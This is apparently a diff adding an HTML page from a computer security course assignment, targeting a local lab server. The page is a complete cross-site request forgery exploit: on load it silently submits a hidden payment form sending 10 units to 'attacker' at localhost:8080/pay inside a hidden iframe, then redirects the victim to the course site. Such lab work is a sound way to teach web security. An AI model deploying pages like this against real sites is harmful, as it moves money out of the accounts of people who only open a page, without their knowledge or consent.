@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+
+<html>
+
+<script>
+    window.addEventListener('load', () => {
+        document.forms['pay_form'].submit();
+        document.getElementById("class-site").addEventListener('load', () => {
+        	window.location.replace('http://cs5435.github.io');
+    	})
+   	})
+</script>
+
+<body>
+
+    <form action="http://localhost:8080/pay" method="post" name="pay_form" hidden target="class-site">
+        <div class="form-group">
+            <div class="form-label">To:</div>
+            <div class="form-input"><input value="attacker" name="recipient" type="text" /></div>
+        </div>
+        <div class="form-group">
+            <div class="form-label">Amount:</div>
+            <div class="form-input"><input value="10" name="amount" type="number" /></div>
+        </div>
+        <input class="form-button" type="submit" value="Pay" />
+
+    </form>
+    <iframe name="class-site" id="class-site" hidden></iframe>
+
+
+</body>
+
+</html>
